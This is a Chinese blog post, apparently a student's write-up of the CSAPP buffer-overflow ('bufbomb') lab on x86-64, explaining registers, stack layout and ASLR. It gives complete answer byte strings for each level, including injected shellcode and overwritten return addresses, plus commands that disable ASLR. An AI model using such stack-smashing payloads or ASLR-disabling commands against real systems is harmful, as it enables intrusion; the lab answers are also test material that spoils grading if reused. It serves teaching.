[ Home ](http://blog.cee.moe) [ Subscribe ](http://blog.cee.moe/rss/)

#  Dear Assembly(3)

01 August 2014

> 这是CSAPP中关于Assembly的第三篇文章，第一篇请戳 [ 这里 ](https://blog.cee.moe/dear-assembly-1/)
，第二篇请戳 [ 这里 ](https://blog.cee.moe/dear-assembly-2/) ~

<del> （大概是lab三部曲） </del>

* * *

###  Intro

引言的话我想推荐大家先去看Ricter菊苣的一篇文章： [ 缓冲区溢出的 Hello World
](http://www.ricter.me/articles/159) 。

这篇文章的话讲的是32位的软娘插屁系统下的缓存区溢出，所以你看到的寄存器还是 ` eax ` 、 ` ebx ` 等等。

今天给大家介绍的话还是主要是通过64位系统下的操作。毕竟寄存器数量翻了一番，位数也翻了一番，效率也更高了。最最最不同的就是汇编的代码也就是实现方式不同了。这
里的话先讲一点基础知识(｢･ω･)｢。

####  关于寄存器

  1. 之前提到过，每个寄存器也是从32位升级到了64位。对于64位的寄存器 ` %rax ` ，它的后32位就相当于原来的 ` %eax ` 。 

  2. 新增了8个用于存放参数和临时变量的寄存器 ` %r8 ` ~ ` r15 ` 。它们的后32位可用作 ` %r8d ` ~ ` %r15d ` 。 

  3. 所有的寄存器可以按照8/16/32/64位读取和写入数据。 

  4. 增加了寄存器，减少了 ` push ` （压栈）和 ` pop ` （出栈）的次数。说明一下不同寄存器的作用： 

    * ` %rax ` ：保存返回值。 

    * ` %rdi ` / ` %rsi ` / ` %rdx ` / ` %rcx ` / ` %r8 ` / ` %r9 ` ：保存参数，最多可以保存6个参数，大于6个采取同32位的做法压栈。 

    * ` %r10 ` / ` %r11 ` ：调用函数（Caller）保存调用前环境参数。 

    * ` %rsp ` ：栈顶指针。 

    * ` %rbp ` ：基址指针。 

    * ` %rbx ` ：基地址。 

    * ` %r12 ` ~ ` %r15 ` ：被调用函数（Callee）的临时变量。 

####  关于内存

  1. 分为运行时栈（Stack），堆（Heap），数据（Data）和指令（Text）四部分： 

    * 栈（Stack）：8MB的限制大小（IA32）。 

    * 堆（Heap）：动态分配，使用 ` malloc ` / ` calloc ` / ` new ` 函数。 

    * 数据（Data）：静态分配，部分只读，部分可读写。 

    * 指令（Text）：运行时机器指令，只读。 

  2. 四部分在内存中的位置由高到低。 

###  Level 0

最简单的level了。这个level前一定要把调用函数的机制搞懂。

Level0是希望在调用 ` test() ` 函数的时候利用内部的 ` getbuf() ` 使程序跳转到 ` smoke() ` 中继续执行。先来看看
` getbuf() ` 函数的全貌：

buffer的长度是36个char，加上压栈时的 ` %rbx ` 和 ` %rbp ` ，前面一共占用36+16=52个byte，最后是8位的return
address。所以答案就是：

> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 （36 char）

>

> 00 00 00 00 00 00 00 00 （%rbx）

>

> 00 00 00 00 00 00 00 00 （%rbp）

>

> 00 00 00 00 c0 10 40 00 （Return address，call smoke）

>

> （注意小端表示）

###  Level 1

和Level 0的区别仅仅在于传递参数的时候有个 ` val ` 要替换成自己的cookie。看一下调用的代码 ` fizz() ` ：

参数共7个，而且 ` val ` 正好是第7个。预备知识里面也提到了，对于一个函数最多可以在寄存器中存放6个参数，也就是说 ` val `
此时是压栈存放的。类似于Level0，我们也就知道了cookie应该保存在哪里了：

> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 （36 char）

>

> 00 00 00 00 00 00 00 00 （%rbx）

>

> 00 00 00 00 00 00 00 00 （%rbp）

>

> 00 00 00 00 70 10 40 00 （Return address，call fizz）

>

> 00 00 00 00 （Alignment）

>

> 00 00 00 00 00 00 00 00 0b 43 71 79 17 a7 27 37 （unsigned long long）

这里Alignment的作用是为了让unsigned long long确保地址是16字节对齐。

###  Level 2

从这关开始越来越有难度了，Level 2是第二天睡醒起来的下午时间做的。 ` bang() ` 这个函数和上面的 ` fizz() `
很像，只不过参数变成了全局变量 ` global_value ` ：

Hints里面也提到了一些trick：

> Do not attempt to use either a ` jmp ` or a ` call ` instruction to jump to
the code for ` bang() ` . These instructions use PC-relative addressing, which
is very tricky to set up correctly. Instead, push an address on the stack and
use the ` retq ` instruction.

不能通过 ` jmp ` 和 ` call ` 指令跳转，因为是和Counter相对寻址的。我们需要找到 ` bang() ` 的入口地址并且把 `
cookie ` 复制一份到 ` global_value ` 中。继续来看 ` bang() ` 函数的汇编函数：

找到我们需要的函数入口 ` 0x401020 ` ， ` cookie ` 的地址 ` 0x602320 ` ， ` global_value ` 的地址
` 0x602308 ` 。这时我们需要写一段汇编来实现函数的跳转：

> movabs 0x602320, %rax ;自己用的直接是立即数

>

> movabs %rax, 0x602308

>

> pushq $0x401020

>

> retq

生成对应的 ` .d ` 文件：

> gcc -c bang.s

>

> objdump -d bang.o > bang.d

写出最后的答案：

> 48 b8 0b 43 71 79 17 a7 27 37 48 a3 08 23 60 00 00 00 00 00 68 20 10 40 00
c3 （attack code, 26 bytes）

>

> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 （26 bytes）

>

> 00 00 a0 be ff ff ff 7f （%rax，where we read buffer）

###  Level 3

最后一关，啊哈，Instruction上又 <del> 很邪恶地 </del> （This style of attack is
tricky）写出了要求：要更改 ` %rbp ` 和返回地址来实现攻击。最终是需要我们在 ` getbuf() ` 函数中返回我们的 ` cookie `
来调用 ` test() ` ：

思想其实和上一题类似，也是要写一段attack code：

> movabs $0x3727a7177971430b, %rax ;复制cookie

>

> movabs $0x7fffffffbf00, %rbp ;更改%rbp

>

> pushq $0x400ef3 ;getbuf调用后的第一条指令，接着继续执行

>

> retq

生成后写出答案：

> 48 b8 0b 43 71 79 17 a7 27 37 48 bd 00 bf ff ff ff 7f 00 00 68 f3 0e 40 00
c3 （attack code, 26 bytes）

>

> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00（26 bytes）

>

> 00 00 a0 be ff ff ff 7f （%rax，where we start comparing）

** 撒花完工，55分到手~ **

###  Why Within Gdb

Instruction在Level 2里面提到了这么一段话：

> For level 2, you will need to run your exploit within gdb for it to succeed.
(the VM has special memory protection that prevents execution of memory
locations in the stack. Since gdb works a little differently, it will allow
the exploit to succeed.)

Level 3也同样有类似的话：

> For level 3, you will need to run your exploit within gdb for it to succeed.

这是为什么呢？自己一开始表示很困惑，于是在Forum上提出了 [ 这个问题
](https://class.coursera.org/hwswinterface-002/forum/thread?thread_id=863)
，很快就有个好心的同学回答了。

我们知道对于大多数GNU/Linux的发行版都有内存保护机制。其中有一种用来保护内存不被攻击的方法叫做 ** Address Space Layout
Randomization（ASLR，位址空间配置随机加载） ** 。位址空间配置随机加载利用随机方式配置资料位址，让某些敏感资料（例如操作系统内核）能配置
到一个恶意程式未能事先得知的位址，令攻击者难于进行攻击。在系统中，ASLR是默认开启的，而gdb则默认禁用了ASLR。所以我们编译后的 ` bufbomb
` 中的地址是可以被确认的，这也就解释了为什么在gdb中可以改写全局变量。

如果想要在系统下执行，可以通过 ` sysctl kernel.randomize_va_space = 0 ` 或者 ` echo 0 >
/proc/sys/kernel/randomize_va_space ` 来解除ASLR，但是这里 ** 肯定不推荐 ** 这么做/w\。

###  References

  * 两篇在32位Linux下的解释也相当精彩： 

    * [ CSApp Buffer Lab ](http://blog.csdn.net/u013648407/article/details/25742553)

    * [ CSApp Bufbomb Lab解题记录 ](http://blog.youlingman.info/csapp-bufbomb-lab-solve/)

  * 当然还有Ricter菊苣的： 

    * [ 缓冲区溢出的 Hello World ](http://www.ricter.me/articles/159)
  * 什么是ASLR： 

    * [ Wikipedia ](http://en.wikipedia.org/wiki/Address_space_layout_randomization)

    * 课本《深入理解计算机系统（原作第二版）》P180 

  * GNU/Linux下的缓存区溢出： 

    * [ 做个试验：简单的缓冲区溢出 ](http://drops.wooyun.org/papers/1421)

    * [ Stack Smashing On A Modern Linux System ](http://www.exploit-db.com/papers/24085/)

* * *

感谢观众姥爷们翻完了这篇毫无技术的文章。两次实验给自己带来了很多知识上的长进，甚至是做出来后的惊喜，也再一次深入了解了C/C++的函数调用和x86-64下的
汇编，算是对课堂知识的一次扩充。

如果有机会的话之后的lab作业也会写点总结的文章。恩就这样~

[ Cee's Picture  ](/author/cee/)

####  [ Cee ](/author/cee/)

Read [ more posts ](/author/cee/) by this author.

Please enable JavaScript to view the [ comments powered by Disqus.
](http://disqus.com/?ref_noscript) [ comments powered by  Disqus
](http://disqus.com)

####  Share this post

[ Twitter
](https://twitter.com/share?text=Dear%20Assembly\(3\)&url=http://blog.cee.moe
/dear-assembly-3/) [ Facebook
](https://www.facebook.com/sharer/sharer.php?u=http://blog.cee.moe/dear-
assembly-3/) [ Google+
](https://plus.google.com/share?url=http://blog.cee.moe/dear-assembly-3/) [
Cee's Home ](http://blog.cee.moe) © 2015  Proudly published with [ Ghost
](https://ghost.org)

